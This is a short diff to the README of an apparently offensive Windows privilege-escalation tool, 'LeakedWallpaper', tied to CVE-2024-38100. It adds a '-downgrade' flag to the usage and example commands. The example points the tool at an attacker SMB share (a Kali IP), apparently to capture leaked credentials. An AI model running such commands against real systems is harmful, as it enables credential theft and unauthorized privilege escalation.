@@ -4,10 +4,10 @@ This is a privilege escalation tool (fixed with CVE-2024-38100 in KB5040434) tha
 # Usage
 
 ```shell
-.\LeakedWallpaper.exe <session> \\<KALI IP>\c$\1.jpg
+.\LeakedWallpaper.exe <session> \\<KALI IP>\c$\1.jpg [-downgrade]
 
 # Example
-  .\LeakedWallpaper.exe 1 \\172.16.0.5\c$\1.jpg
+  .\LeakedWallpaper.exe 1 \\172.16.0.5\c$\1.jpg -downgrade
 ```
 
 # Demo
